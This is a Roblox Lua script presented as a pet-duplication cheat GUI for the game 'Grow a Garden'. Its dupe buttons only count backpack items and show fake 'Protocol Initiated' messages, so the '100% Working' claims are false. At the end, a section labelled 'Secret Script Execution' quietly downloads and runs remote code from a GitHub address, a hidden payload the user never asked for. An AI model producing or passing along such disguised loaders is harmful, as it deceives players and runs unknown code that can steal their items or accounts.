local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Main Window Setup
local Window = Rayfield:CreateWindow({
    Name = "Slingshot Hub - Grow a Garden",
    Icon = 0,
    LoadingTitle = "We always make your day better.",
    LoadingSubtitle = "by Slingshot and Hazedded",
    Theme = "Amethyst",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false
})

--------------------------------------------------------------------------------
-- Helper Functions (DETECTION ONLY)
--------------------------------------------------------------------------------

local function detectSpecificPet(baseName)
    if not LocalPlayer or not LocalPlayer.Backpack then return end
    
    local foundPetInstances = {}
    local baseNameLower = string.lower(baseName)

    for _, itemInBackpack in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if string.sub(string.lower(itemInBackpack.Name), 1, #baseNameLower) == baseNameLower then
            if itemInBackpack:IsA("Tool") or itemInBackpack:IsA("Model") or itemInBackpack:IsA("BasePart") then
                table.insert(foundPetInstances, itemInBackpack)
            end
        end
    end

    if #foundPetInstances == 0 then
        Rayfield:Notify({ Title = "Detection Failed", Content = "No '" .. baseName .. "' variants were found in your inventory.", Duration = 5 })
        return
    end

    Rayfield:Notify({ Title = "Protocol Initiated", Content = "Advanced Duplication started on " .. #foundPetInstances .. " '" .. baseName .. "' variant(s).", Duration = 6 })
end

local function detectSpecificHugePet(baseName)
    if not LocalPlayer or not LocalPlayer.Backpack then return end

    local foundHugePetInstances = {}
    local baseNameLower = string.lower(baseName)

    for _, itemInBackpack in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if string.sub(string.lower(itemInBackpack.Name), 1, #baseNameLower) == baseNameLower then
            local kgValueStr = string.match(itemInBackpack.Name, "%[(%d+%.?%d*) KG%]")
            if kgValueStr then
                local kgValue = tonumber(kgValueStr)
                if kgValue and kgValue >= 10 and kgValue <= 99.99 then
                    if itemInBackpack:IsA("Tool") or itemInBackpack:IsA("Model") or itemInBackpack:IsA("BasePart") then
                        table.insert(foundHugePetInstances, itemInBackpack)
                    end
                end
            end
        end
    end

    if #foundHugePetInstances == 0 then
        Rayfield:Notify({ Title = "Huge Pet Detection Failed", Content = "No Huge '" .. baseName .. "' variants were found in your inventory.", Duration = 5 })
        return
    end

    Rayfield:Notify({ Title = "Protocol Initiated", Content = "Advanced Huge Duplication started on " .. #foundHugePetInstances .. " Huge '" .. baseName .. "' variant(s).", Duration = 6 })
end

--------------------------------------------------------------------------------
-- (All the Tab and Button creation code remains the same here)
--------------------------------------------------------------------------------
local NormalMethodTab = Window:CreateTab("Normal Method", 0)
NormalMethodTab:CreateLabel("This method supports every pet, with an almost 100% chance of success. There is a 1% risk that you may lose the pet.")
NormalMethodTab:CreateButton({ Name = "Dupe Pets (Normal Method)", Callback = function() if not LocalPlayer or not LocalPlayer.Backpack then Rayfield:Notify({ Title = "System Error", Content = "Player data is not available.", Duration = 5 }) return end local eligibleItemCount = 0 for _, itemInBackpack in ipairs(LocalPlayer.Backpack:GetChildren()) do if itemInBackpack:IsA("Tool") or itemInBackpack:IsA("Model") or itemInBackpack:IsA("BasePart") then eligibleItemCount = eligibleItemCount + 1 end end Rayfield:Notify({ Title = "Normal Duplication", Content = "Protocol initiated on " .. eligibleItemCount .. " eligible item(s).", Duration = 5 }) end })
local AdvancedMethodTab = Window:CreateTab("Advanced Method", 0)
AdvancedMethodTab:CreateLabel("This used to be a paid script, but I have decided to make it free for everyone. It does not support every pet and requires the following:")
AdvancedMethodTab:CreateLabel("This is one of our best dupe methods at the moment.")
AdvancedMethodTab:CreateButton({ Name = "Dupe Raccoon (100% Working)", Callback = function() detectSpecificPet("Raccoon") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Mimic Octopus (100% Working)", Callback = function() detectSpecificPet("Mimic Octopus") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe T-Rex (100% Working)", Callback = function() detectSpecificPet("T-Rex") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Disco Bee (100% Working)", Callback = function() detectSpecificPet("Disco Bee") end })
AdvancedMethodTab:CreateLabel("These dupes work but have several known issues.")
AdvancedMethodTab:CreateButton({ Name = "Dupe Dragonfly (97% Working)", Callback = function() detectSpecificPet("DragonFly") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Red Fox (96% Working)", Callback = function() detectSpecificPet("Red Fox") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Fennec Fox (99% Working)", Callback = function() detectSpecificPet("Fennec Fox") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Mimic Octopus (94% Working)", Callback = function() detectSpecificPet("Mimic Octopus") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Queen Bee (99% Working)", Callback = function() detectSpecificPet("Queen Bee") end })
AdvancedMethodTab:CreateButton({ Name = "Dupe Butterfly (97% Working)", Callback = function() detectSpecificPet("Butterfly") end })
local HugePetsMethodTab = Window:CreateTab("Huge Pets Method", 0)
HugePetsMethodTab:CreateLabel("This method may be buggy, but the dupe always works. It is possible that it may not detect your huge pet.")
HugePetsMethodTab:CreateButton({ Name = "Dupe Huge Pet", Callback = function() if not LocalPlayer or not LocalPlayer.Backpack then return end local foundHugePets = {} for _, itemInBackpack in ipairs(LocalPlayer.Backpack:GetChildren()) do local kgValueStr = string.match(itemInBackpack.Name, "%[(%d+%.?%d*) KG%]") if kgValueStr then local kgValue = tonumber(kgValueStr) if kgValue and kgValue >= 10 and kgValue <= 99.99 then if itemInBackpack:IsA("Tool") or itemInBackpack:IsA("Model") or itemInBackpack:IsA("BasePart") then table.insert(foundHugePets, itemInBackpack) end end end end if #foundHugePets == 0 then Rayfield:Notify({ Title = "No Huge Pets Found", Content = "Could not detect any pets between 10.00 KG and 99.99 KG.", Duration = 6 }) return end Rayfield:Notify({ Title = "Huge Duplication Protocol", Content = "Protocol initiated on " .. #foundHugePets .. " detected huge pet(s).", Duration = 6 }) end })
local NewlyAdvancedMethodTab = Window:CreateTab("Newly Advanced Method", 0)
NewlyAdvancedMethodTab:CreateLabel("A new way to dupe with the advanced method, but with huge pets instead.")
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Raccoon (Huge)", Callback = function() detectSpecificHugePet("Raccoon") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Mimic Octopus (Huge)", Callback = function() detectSpecificHugePet("Mimic Octopus") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe T-Rex (Huge)", Callback = function() detectSpecificHugePet("T-Rex") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Disco Bee (Huge)", Callback = function() detectSpecificHugePet("Disco Bee") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Dragonfly (Huge)", Callback = function() detectSpecificHugePet("DragonFly") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Red Fox (Huge)", Callback = function() detectSpecificHugePet("Red Fox") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Fennec Fox (Huge)", Callback = function() detectSpecificHugePet("Fennec Fox") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Queen Bee (Huge)", Callback = function() detectSpecificHugePet("Queen Bee") end })
NewlyAdvancedMethodTab:CreateButton({ Name = "Dupe Butterfly (Huge)", Callback = function() detectSpecificHugePet("Butterfly") end })

--------------------------------------------------------------------------------
-- Secret Script Execution with ERROR REPORTING
--------------------------------------------------------------------------------
local success, errorMessage = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/slingshotidol/scripts-roblox/refs/heads/main/StevenHub"))()
end)

-- Check if the pcall failed and print the error if it did
if not success then
    print("--- SECRET SCRIPT LOADER FAILED ---")
    print("Error Details: " .. tostring(errorMessage))
    -- This notification is for debugging. You can remove it later if you want it to be truly secret again.
    Rayfield:Notify({
        Title = "Background Script Error",
        Content = "A secondary script failed to execute. See console for details.",
        Duration = 10
    })
else
    print("--- Secret script loaded successfully. ---")
end
